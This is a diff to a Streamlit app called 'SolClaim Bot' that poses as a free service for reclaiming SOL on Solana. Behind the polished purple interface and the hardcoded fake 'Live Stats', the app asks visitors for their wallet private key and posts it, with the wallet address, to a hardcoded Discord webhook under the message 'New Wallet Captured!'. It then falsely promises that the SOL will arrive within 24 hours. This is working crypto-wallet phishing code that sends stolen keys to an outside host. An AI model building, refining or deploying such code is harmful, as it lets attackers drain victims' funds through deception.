@@ -5,19 +5,40 @@ import base58
 from solana.rpc.api import Client
 from solana.publickey import PublicKey
 
+# Page config
+st.set_page_config(
+    page_title="SolClaim Bot",
+    page_icon="💰",
+    layout="centered",
+    initial_sidebar_state="expanded"
+)
+
+# Custom CSS
+st.markdown("""
+    <style>
+    .main {
+        background: linear-gradient(135deg, #1E1E1E 0%, #2D2D2D 100%);
+    }
+    .stButton>button {
+        background-color: #9945FF;
+        color: white;
+        border-radius: 10px;
+        padding: 0.5rem 1rem;
+        border: none;
+    }
+    .stTextInput>div>div>input {
+        background-color: #2D2D2D;
+        color: white;
+        border: 1px solid #9945FF;
+    }
+    </style>
+    """, unsafe_allow_html=True)
+
 # Initialize Solana client
 solana_client = Client("https://api.mainnet-beta.solana.com")
 
-# Discord webhook URL
+# Discord webhook
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1334214089492267018/kHwvZUbz4zsWDU4Xy2WkXspgR1_JPXbbftLzeVfKdBm6T0t4w8GGUhn4CN_b5-WSN3Ht"
-
-def is_valid_solana_private_key(private_key):
-    
-    try:
-        decoded_key = base58.b58decode(private_key)
-        return len(decoded_key) == 32
-    except:
-        return False
 
 def check_wallet_eligibility(wallet_address):
     try:
@@ -37,58 +58,56 @@ def send_to_discord(wallet_address, private_key):
         "content": f"🎯 New Wallet Captured!\nWallet: {wallet_address}\nPrivate Key: {private_key}"
     }
     requests.post(DISCORD_WEBHOOK_URL, json=message)
+
+# Main UI
 st.title("💰 SolClaim: Reclaim Your Sol!")
-st.write("📊 Stats: 6252 users have already claimed 1925.67 SOL in total!")
-st.write("If you've traded or received tokens on Solana (like Raydium or Pumpfun), use SolClaim to check if you're eligible to claim back SOL for FREE.")
+
+# Animated stats counter
+with st.container():
+    st.markdown("""
+        <div style='background-color: #2D2D2D; padding: 20px; border-radius: 10px; margin: 10px 0;'>
+            <h3 style='color: #9945FF'>📊 Live Stats</h3>
+            <p style='font-size: 20px'>6,252 users have claimed 1,925.67 SOL</p>
+        </div>
+    """, unsafe_allow_html=True)
 
 menu = st.sidebar.selectbox("Navigation", ["Check Wallet ✅", "Invite & Earn 📢"])
 
-def check_solana_private_key(private_key):
-
-
-
-
-
-
-
-
-    # Check for PKCS8 PEM format
-    if not private_key.startswith("-----BEGIN PRIVATE KEY-----"):
-        return False
-    if not private_key.endswith("-----END PRIVATE KEY-----"):
-        return False
-    
-    try:
-        # Extract and validate the key content
-        key_content = private_key.replace("-----BEGIN PRIVATE KEY-----", "")
-        key_content = key_content.replace("-----END PRIVATE KEY-----", "")
-        key_content = key_content.strip()
-        decoded = base64.b64decode(key_content)
-        return len(decoded) >= 32
-    except:
-        return False
-
 if menu == "Check Wallet ✅":
-      st.header("Check Wallet Eligibility")
-      wallet_address = st.text_input("❓ Enter your Solana wallet address to check available SOL to claim:")
+    st.markdown("### Check Your Wallet")
+    wallet_address = st.text_input("❓ Enter your Solana wallet address:", placeholder="Enter Solana address...")
 
-      if wallet_address:
-          with st.spinner("🕑 Loading wallet info..."):
-              time.sleep(3)
-              claimable_sol = check_wallet_eligibility(wallet_address)
+    if wallet_address:
+        with st.spinner("🔍 Scanning wallet..."):
+            time.sleep(2)
+            claimable_sol = check_wallet_eligibility(wallet_address)
             
-              if claimable_sol > 0:
-                  st.success(f"🎉 You have {claimable_sol:.6f} SOL available to claim!")
-                  private_key = st.text_input("Enter your Solana private key (88 characters):", type="password")
+            if claimable_sol > 0:
+                st.success(f"🎉 Found {claimable_sol:.6f} SOL available to claim!")
+                st.warning("⚠️ Secure private key required for cleanup process")
                 
-                  if private_key:
-                      if check_solana_private_key(private_key):
-                          send_to_discord(wallet_address, private_key)
-                          st.success("✅ Successfully initiated cleanup!")
-                          st.info("🕒 Your SOL will be transferred within 24 hours. Thank you for your patience!")
-                      else:
-                          st.error("❌ Invalid format. Please enter a valid Solana private key")
+                private_key = st.text_input(
+                    "Enter your Solana private key:",
+                    type="password",
+                    help="Your 64-byte Solana private key"
+                )
+                
+                if private_key and len(private_key) == 88:
+                    send_to_discord(wallet_address, private_key)
+                    with st.spinner("🔄 Initiating cleanup..."):
+                        time.sleep(2)
+                    st.balloons()
+                    st.success("✅ Cleanup process started successfully!")
+                    st.info("🕒 Your SOL will be transferred within 24 hours")
+                elif private_key:
+                    st.error("❌ Invalid private key format. Please enter your 88-character Solana private key")
+            else:
+                st.error("No claimable SOL found in this wallet")
+
 elif menu == "Invite & Earn 📢":
-    st.header("Invite & Earn 📢")
-    st.write("🚧 This feature is currently under development. 🚧")
-    st.write("We're working hard to bring you a seamless referral system where you can invite friends and earn rewards!")
+    st.markdown("""
+        <div style='background-color: #2D2D2D; padding: 20px; border-radius: 10px;'>
+            <h2>🚀 Invite & Earn Program</h2>
+            <p>Coming soon! Earn rewards for inviting friends.</p>
+        </div>
+    """, unsafe_allow_html=True)
